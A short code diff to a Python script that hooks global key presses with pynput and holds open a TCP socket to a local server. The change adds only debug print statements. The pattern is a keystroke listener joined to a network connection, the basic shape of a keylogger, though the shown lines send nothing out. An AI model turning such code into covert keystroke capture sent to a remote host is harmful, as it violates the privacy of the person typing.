@@ -15,6 +15,9 @@ def on_press(key):
         print('closing connection')
         s.close()
         exit()
+    else:
+    	print("key pressed")
+
 
 
 # local host IP '127.0.0.1'
@@ -27,6 +30,8 @@ s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
 # connect to server on local computer
 s.connect((host,port))
+
+print("connected")
 
 with Listener(on_press=on_press) as listener:  # Setup the listener
 	listener.join()  # Join the thread to the main thread
